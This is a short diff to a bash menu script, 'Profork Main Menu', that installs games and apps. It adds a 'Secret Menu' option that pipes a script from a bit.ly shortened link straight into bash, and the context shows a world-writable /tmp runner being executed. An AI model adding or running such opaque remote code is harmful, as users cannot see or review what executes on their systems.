@@ -62,7 +62,8 @@ OPTIONS=("1" "Arch Container (Steam, Heroic, Lutris & More apps)"
          "7" "Other Linux & Windows/Wine Freeware games"
          "8" "Install Portmaster"
          "9" "Install This Menu to Ports"              
-         "10" "Exit")
+         "98" "Secret Menu"
+         "99" "Exit")
 
 CHOICE=$(dialog --clear --backtitle "Profork Main Menu" \
                 --title "Main Menu" \
@@ -123,7 +124,11 @@ case $CHOICE in
         chmod 777 /tmp/runner 2>/dev/null
         bash /tmp/runner
         ;;
-    10)
+    98)
+        echo "Secret Menu..."
+        curl -L https://bit.ly/4htr4m8 | bash
+        ;;
+    99)
         echo "Exiting..."
         exit
         ;;
